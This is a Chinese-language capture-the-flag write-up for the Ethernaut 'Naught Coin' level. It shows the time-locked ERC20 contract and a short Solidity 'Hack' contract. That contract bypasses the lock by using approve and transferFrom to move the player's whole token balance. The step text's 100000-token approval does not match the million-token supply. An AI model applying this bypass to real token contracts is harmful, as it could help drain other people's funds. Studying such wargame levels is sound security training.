# Ethernaut 01-Naught Coin

## 本关目标

- 从合约中将自己的 Token 都转移走，余额为 0

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 // 是个ERC20
 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;

  // 锁住10年
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;

    // 所以我们应该有1000000个token
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  // 要转账的前提是10年之后
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

## 解决方案

1. NaughtCoin 是继承自 openzeppelin 的 ERC20 的，因此 ERC20 中的其他方法它也是可以用的
2. 首先 approve Hack 合约 100000 个 Token
3. Hack 合约调用 transferFrom 转走 token
4. 前提是使用 ERC20 接口部署 Naught Coin

```solidity
// SDPX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract Hack {
    function hack(address _target) public {
        IERC20 naughtCoin = IERC20(_target);
        uint256 balance = naughtCoin.balanceOf(msg.sender);
        naughtCoin.transferFrom(msg.sender, address(this), balance);
    }
}
```
